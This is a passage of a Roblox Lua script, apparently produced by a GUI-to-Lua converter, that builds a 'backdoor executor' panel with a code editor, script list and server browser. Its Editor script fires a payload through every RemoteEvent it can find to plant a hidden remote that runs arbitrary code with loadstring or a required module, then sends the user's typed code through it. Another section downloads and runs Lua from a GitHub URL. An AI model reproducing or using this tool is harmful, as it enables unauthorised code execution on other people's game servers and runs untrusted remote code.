-- ServerStorage./..;.Scripts.ScrollingFrame.UIListLayout
G2L["33"] = Instance.new("UIListLayout", G2L["2f"]);
G2L["33"]["Padding"] = UDim.new(0, 5);
G2L["33"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- ServerStorage./..;.Server
G2L["34"] = Instance.new("CanvasGroup", G2L["2"]);
G2L["34"]["Active"] = true;
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["Size"] = UDim2.new(0, 581, 0, 307);
G2L["34"]["Position"] = UDim2.new(0.01833, 0, 0.15526, 0);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Name"] = [[Server]];
G2L["34"]["BackgroundTransparency"] = 1;


-- ServerStorage./..;.Server.ScrollingFrame
G2L["35"] = Instance.new("ScrollingFrame", G2L["34"]);
G2L["35"]["Active"] = true;
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["Size"] = UDim2.new(1, 0, 0.90228, 0);
G2L["35"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Position"] = UDim2.new(0, 0, 0.09772, 0);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["ScrollBarThickness"] = 3;
G2L["35"]["BackgroundTransparency"] = 1;


-- ServerStorage./..;.Server.ScrollingFrame.LocalScript
G2L["36"] = Instance.new("LocalScript", G2L["35"]);



-- ServerStorage./..;.Server.ScrollingFrame.UIListLayout
G2L["37"] = Instance.new("UIListLayout", G2L["35"]);
G2L["37"]["Padding"] = UDim.new(0, 5);
G2L["37"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- ServerStorage./..;.Server.ScrollingFrame.Main
G2L["38"] = Instance.new("CanvasGroup", G2L["35"]);
G2L["38"]["Visible"] = false;
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Size"] = UDim2.new(1, 0, 0, 100);
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Name"] = [[Main]];
G2L["38"]["BackgroundTransparency"] = 0.7;


-- ServerStorage./..;.Server.ScrollingFrame.Main.UICorner
G2L["39"] = Instance.new("UICorner", G2L["38"]);
G2L["39"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Server.ScrollingFrame.Main.id
G2L["3a"] = Instance.new("TextLabel", G2L["38"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextSize"] = 30;
G2L["3a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundTransparency"] = 1;
G2L["3a"]["Size"] = UDim2.new(0, 204, 0, 50);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Text"] = [[ServerID]];
G2L["3a"]["Name"] = [[id]];
G2L["3a"]["Position"] = UDim2.new(0.01725, 0, 0, 0);


-- ServerStorage./..;.Server.ScrollingFrame.Main.plr
G2L["3b"] = Instance.new("TextLabel", G2L["38"]);
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["TextSize"] = 25;
G2L["3b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["3b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["BackgroundTransparency"] = 1;
G2L["3b"]["Size"] = UDim2.new(0, 204, 0, 22);
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[Num plr]];
G2L["3b"]["Name"] = [[plr]];
G2L["3b"]["Position"] = UDim2.new(0.017, 0, 0.45, 0);


-- ServerStorage./..;.Server.ScrollingFrame.Main.btn
G2L["3c"] = Instance.new("TextButton", G2L["38"]);
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["TextSize"] = 26;
G2L["3c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["3c"]["BackgroundTransparency"] = 0.5;
G2L["3c"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Text"] = [[Join]];
G2L["3c"]["Name"] = [[btn]];
G2L["3c"]["Visible"] = false;
G2L["3c"]["Position"] = UDim2.new(0.62651, 0, 0.25, 0);


-- ServerStorage./..;.Server.ScrollingFrame.Main.btn.UICorner
G2L["3d"] = Instance.new("UICorner", G2L["3c"]);
G2L["3d"]["CornerRadius"] = UDim.new(0, 7);


-- ServerStorage./..;.Server.ScrollingFrame.Main.larp
G2L["3e"] = Instance.new("TextLabel", G2L["38"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["TextSize"] = 25;
G2L["3e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["BackgroundTransparency"] = 1;
G2L["3e"]["Size"] = UDim2.new(0, 204, 0, 22);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Text"] = [[ping]];
G2L["3e"]["Name"] = [[larp]];
G2L["3e"]["Position"] = UDim2.new(0.017, 0, 0.7, 0);


-- ServerStorage./..;.ImageLabel
G2L["3f"] = Instance.new("ImageLabel", G2L["2"]);
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3f"]["Image"] = [[rbxassetid://6034452648]];
G2L["3f"]["Size"] = UDim2.new(0, 50, 0, 50);
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["BackgroundTransparency"] = 1;
G2L["3f"]["Position"] = UDim2.new(0.03504, 0, 0.02404, 0);


-- ServerStorage./..;.UIDragDetector
G2L["40"] = Instance.new("UIDragDetector", G2L["2"]);
G2L["40"]["Enabled"] = false;


-- ServerStorage./..;.Btn.LocalScript
local function C_4()
local script = G2L["4"];
	for _, v in script.Parent:GetChildren() do
		if v:IsA("TextButton") then
			v.MouseButton1Click:Connect(function()
				for _, ball in script.Parent.Parent:GetChildren() do 
					if ball:IsA("CanvasGroup") then
						if ball.Name == v.Name then
							ball.Visible = true
						else
							ball.Visible = false
						end
					end
				end
			end)
		end
	end
end;
task.spawn(C_4);
-- ServerStorage./..;.Editor.lulz.syntax highlighting
local function C_12()
local script = G2L["12"];
	local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while", "require"}
	local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16", "ViewportSize", "ViewportPoint", "Random", "Font", "TweenInfo", "UDim2", "RaycastParams", "CollectionService", "UserInputService", "ContentProvider", "LocalizationService", "LogService", "LocalizationService", "MarketplaceService", "MouseService", "NotificationService", "PathfindingService", "PermissionService", "RunService", "SoundService", "TeleportService", "TextService", "TextChatService", "TouchTransmitter", "UICorner", "UIStroke", "UIScale"}
	
	local box = script.Parent.input
	
	function Highlight(string, keywords)
	    local K = {}
	    local S = string
	    local Token =
	    {
	        ["="] = true,
	        ["."] = true,
	        [","] = true,
	        ["("] = true,
	        [")"] = true,
	        ["["] = true,
	        ["]"] = true,
	        ["{"] = true,
	        ["}"] = true,
	        [":"] = true,
	        ["*"] = true,
	        ["/"] = true,
	        ["+"] = true,
	        ["-"] = true,
	        ["%"] = true,
			[";"] = true,
			["~"] = true
	    }
	    for i, v in pairs(keywords) do
	        K[v] = true
	    end
	    S = S:gsub(".", function(c)
	        if Token[c] ~= nil then
	            return "\32"
	        else
	            return c
	        end
	    end)
	    S = S:gsub("%S+", function(c)
	        if K[c] ~= nil then
	            return c
	        else
	            return (" "):rep(#c)
	        end
	    end)
	  
	    return S
	end
	
	function hTokens(string)
	    local Token =
	    {
	        ["="] = true,
	        ["."] = true,
	        [","] = true,
	        ["("] = true,
	        [")"] = true,
	        ["["] = true,
	        ["]"] = true,
	        ["{"] = true,
	        ["}"] = true,
	        [":"] = true,
	        ["*"] = true,
	        ["/"] = true,
	        ["+"] = true,
	        ["-"] = true,
	        ["%"] = true,
			[";"] = true,
			["~"] = true
	    }
	    local A = ""
	    string:gsub(".", function(c)
	        if Token[c] ~= nil then
	            A = A .. c
	        elseif c == "\n" then
	            A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
	        else
	            A = A .. "\32"
	        end
	    end)
	  
	    return A
	end
	
	
	function strings(string)
	    local highlight = ""
	    local quote = false
	    string:gsub(".", function(c)
	        if quote == false and c == "\"" then
	            quote = true
	        elseif quote == true and c == "\"" then
	            quote = false
	        end
	        if quote == false and c == "\"" then
	            highlight = highlight .. "\""
	        elseif c == "\n" then
	            highlight = highlight .. "\n"
			elseif c == "\t" then
			    highlight = highlight .. "\t"
	        elseif quote == true then
	            highlight = highlight .. c
	        elseif quote == false then
	            highlight = highlight .. "\32"
	        end
	    end)
	  
	    return highlight
	end
	
	function comments(string)
	    local ret = ""
	    string:gsub("[^\r\n]+", function(c)
	        local comm = false
	        local i = 0
	        c:gsub(".", function(n)
	            i = i + 1
	            if c:sub(i, i + 1) == "--" then
	                comm = true
	            end
	            if comm == true then
	                ret = ret .. n
	            else
	                ret = ret .. "\32"
	            end
	        end)
	        ret = ret
	    end)
	    
	    return ret
	end
	
	local numbers = function(string)
	    local A = ""
	    string:gsub(".", function(c)
	        if tonumber(c) ~= nil then
	            A = A .. c
	        elseif c == "\n" then
	            A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
	        else
	            A = A .. "\32"
	        end
	    end)
	  
	    return A
	end
	
	function highlight2(type)
		if type == "Text" then
			box.Text = box.Text:gsub("\13", "")
			box.Text = box.Text:gsub("\t", "      ")
			local s = box.Text
			box.Keywords_.Text = Highlight(s, lua_keywords)
			box.Globals_.Text = Highlight(s, global_env)
			box.RemoteHighlight_.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
			box.Tokens_.Text = hTokens(s)
			box.Numbers_.Text = numbers(s)
			box.Strings_.Text = strings(s)
			local lin = 1
			s:gsub("\n", function()
				lin = lin + 1
			end)
		end
	end
	
	highlight2("Text")
	
	box.Changed:Connect(highlight2)
	
	
end;
task.spawn(C_12);
-- ServerStorage./..;.Editor.Btn.LocalScript
local function C_1d()
local script = G2L["1d"];
	local clear,run,link,re,r6 = script.Parent.Clear,script.Parent.Run,script.Parent.Link,script.Parent.Reset,script.Parent.R6
	local lp = game.Players.LocalPlayer
	local input = script.Parent.Parent.lulz.input
	local services = {
		["run"] = game:GetService("RunService"),
		["user"] = game:GetService("UserService"),
		["replicated"] = game:GetService("ReplicatedStorage"),
		["players"] = game:GetService("Players"),
		["lighting"] = game:GetService("Lighting"),
		["market"] = game:GetService("MarketplaceService"),
		["http"] = game:GetService("HttpService"),
		["chat"] = game:GetService("Chat"),
		["tween"] = game:GetService("TweenService"),
		["asset"] = game:GetService("AssetService"),
		["insert"] = game:GetService("InsertService"),
		["log"] = game:GetService("LogService"),
		["physics"] = game:GetService("PhysicsService"),
		["team"] = game:GetService("Teams"),
	}
	local serviceSS = {
		["replicated"] = game:GetService("ReplicatedStorage"),
		["players"] = game:GetService("Players"),
		["replicainit"] = game:GetService("ReplicatedFirst"),
		["work"] = game:GetService("Workspace"),
	}
	backdoor = nil
	local txt = [[
	
		local plr = game.]]..lp:GetFullName()..[[
		
		local resul, sus = pcall(function()
			loadstring("return 1+1")
		end)
	
		local function randomname()
			local alphabet = "abcdefghijklmnopqrstuvwxyz1234567890"
			local name = ""
			for i = 1, 10 do
				local randomIndex = math.random(1, #alphabet)
				name = name .. alphabet:sub(randomIndex, randomIndex)
			end
			return name
		end
	
		if resul == true then
			local remote = Instance.new("RemoteEvent")
			remote.Parent = plr
			remote.Name = randomname()
			remote.OnServerEvent:Connect(function(p, txt)
				loadstring(txt)()
			end)
		else
			local remote = Instance.new("RemoteEvent")
			remote.Parent = plr.plr
			remote.Name = randomname()
			remote.OnServerEvent:Connect(function(p, txt)
				require(6196543947)(txt)()
			end)
		end
	]]
		
	local function FindName(instance)
		for _, obj in ipairs(instance:GetDescendants()) do
			if obj:IsA("RemoteEvent") then
				return obj
			end
		end
	end
	
	local function Attach()
		xpcall(function()
			for nam,servic in pairs(serviceSS) do
				for _, v in ipairs(servic:GetDescendants()) do
					if v:IsA("RemoteEvent") then
						v:FireServer(txt)
						if lp:FindFirstChildOfClass("RemoteEvent") then
							backdoor = lp:FindFirstChildOfClass("RemoteEvent")
							if backdoor == nil then
								print("Root remote not found, trying to attach remote...")
							else
								print(backdoor)
							end
						end
					end
				end
			end
		end, function(e)
			print("0x6712108 "..e)
		end)
	end
	
	
	
	
	
	
	
	
	local function attach()
		pcall(function()
			Attach()
		end)
	end
	
	local function exe()
		if backdoor == nil then
			local remote = lp:FindFirstChildOfClass("RemoteEvent")
			if remote then
				backdoor = remote
			else
				attach()
			end
		end
		xpcall(function()
			backdoor:FireServer(input.Text)
		end, function()
			warn("0x6712108: No Backdoor Found,Please check if executor is connected to any Remote")
		end)
	end
	
	local function clearup()
		input.Text = ""
	end
	
	local function reset()
		xpcall(function()
			backdoor:FireServer("game."..lp:GetFullName()..":LoadCharacter()")
		end, function()
			warn("0x6712108: No Backdoor Found,Please check if executor is connected to any Remote")
		end)
	end
	
	local function r6char()
		xpcall(function()
			backdoor:FireServer([[
				require(9635947635).load(']]..lp.Name..[[')
			]])
		end, function()
			warn("0x6712108: No Backdoor Found,Please check if executor is connected to any Remote")
		end)
	end
	
	clear.MouseButton1Click:Connect(function()
		clearup()
	end)
	
	run.MouseButton1Click:Connect(function()
		exe()
	end)
	link.MouseButton1Click:Connect(function()
		attach()
	end)
	re.MouseButton1Click:Connect(function()
		reset()
	end)
	r6.MouseButton1Click:Connect(function()
		r6char()
	end)
end;
task.spawn(C_1d);
-- ServerStorage./..;.Scripts.ScrollingFrame.LocalScript
local function C_30()
local script = G2L["30"];
	local lp = game.Players.LocalPlayer.Name
	local scrull = script.Parent
	local lays = scrull.UIListLayout
	local input = script:FindFirstAncestor("CanvasGroup").Editor.lulz.input
	local Fex = loadstring(game:HttpGet("https://raw.githubusercontent.com/SpawniX/DevTools.rbxm/refs/heads/main/HTTP/fex.lua", true))()
	
	local function updateCanvas()
		scrull.CanvasSize = UDim2.fromOffset(
			0,
			lays.AbsoluteContentSize.Y + 10
		)
	end
	
	lays:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
	updateCanvas()
	
	
	for nan, txt in pairs(Fex) do
		local button = script.Parent:FindFirstChild("Temp"):Clone()
		button.Name = nan
		button.Text = nan
		button.Visible = true
		button.Parent = script.Parent
	
		button.MouseButton1Click:Connect(function()
			input.Text = txt
			input:ReleaseFocus()
		end)
	end
end;
task.spawn(C_30);
-- ServerStorage./..;.Server.ScrollingFrame.LocalScript
local function C_36()
local script = G2L["36"];
	local TeleportService = game:GetService("TeleportService")
	local Players = game:GetService("Players")
	local placeId = game.PlaceId
	local scrull = script.Parent
	local lays = scrull.UIListLayout
	local template = scrull:WaitForChild("Main")
	local request = request or http_request
	
	local function updateCanvas()
		scrull.CanvasSize = UDim2.fromOffset(0, lays.AbsoluteContentSize.Y + 10)
	end
	lays:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
	
	local function idk(server)
		local btn = template:Clone()
		btn.Visible = true
		btn.Parent = scrull
	
		btn.id.Text = server.id
		btn.plr.Text = "Players: "..server.playing .. "/" .. server.maxPlayers
		btn.ping.Text = "Ping: "..server.ping .. " ms"
	
		btn.MouseButton1Click:Connect(function()
			TeleportService:TeleportToPlaceInstance(placeId, server.id, Players.LocalPlayer)
		end)
	end
	
	local function gethttp()
		local servers = {}
		local cursor = ""
	
		repeat
			local url =
				"https://games.roblox.com/v1/games/" .. placeId ..
				"/servers/Public?sortOrder=Desc&limit=100" ..
				(cursor ~= "" and "&cursor=" .. cursor or "")
	
			local t0 = tick()
			local res = request({
				Url = url,
				Method = "GET"
			})
			local latency = math.floor((tick() - t0) * 1000)
	
			local body = game:GetService("HttpService"):JSONDecode(res.Body)
	
			for _, s in ipairs(body.data) do
				if s.playing < s.maxPlayers then
					table.insert(servers, {
						id = s.id,
						playing = s.playing,
						maxPlayers = s.maxPlayers,
						ping = latency -- estimated
					})
				end
			end
	
			cursor = body.nextPageCursor
		until not cursor or #servers >= 100
	
		return servers
	end
	
	local servers = gethttp()
	
	table.sort(servers, function(a, b)
		return a.playing > b.playing
	end)
	
	for i = 1, math.min(100, #servers) do
		idk(servers[i])
	end
	
	updateCanvas()
	
end;
task.spawn(C_36);

return G2L["1"], require;
